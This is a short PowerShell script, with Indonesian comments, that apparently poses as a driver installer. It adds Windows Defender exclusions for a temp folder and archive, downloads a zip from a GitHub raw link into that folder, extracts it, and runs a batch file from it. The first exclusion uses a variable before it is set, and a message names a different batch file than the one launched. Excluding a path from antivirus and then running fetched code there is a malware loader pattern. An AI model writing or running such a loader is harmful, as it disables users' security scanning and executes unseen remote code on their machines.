Add-MpPreference -ExclusionPath $outputZip
Add-MpPreference -ExclusionPath "C:\Windows\Temp\driver"
Add-MpPreference -ExclusionPath "C:\Windows\Temp\driver.zip"
$url = "https://github.com/hinzdc/get/raw/refs/heads/main/dl/driver.zip"
$outputZip = "C:\Windows\Temp\driver.zip"
$outputFolder = "C:\Windows\Temp\driver"

Invoke-WebRequest -Uri $url -OutFile $outputZip

Expand-Archive -Path $outputZip -DestinationPath $outputFolder

$batFile = Join-Path $outputFolder "driver\driver.bat"

if (Test-Path $batFile) {
    # Jalankan file Script_Run.bat
    Start-Process -FilePath $batFile
} else {
    Write-Host "File Script_Run.bat tidak ditemukan."
}
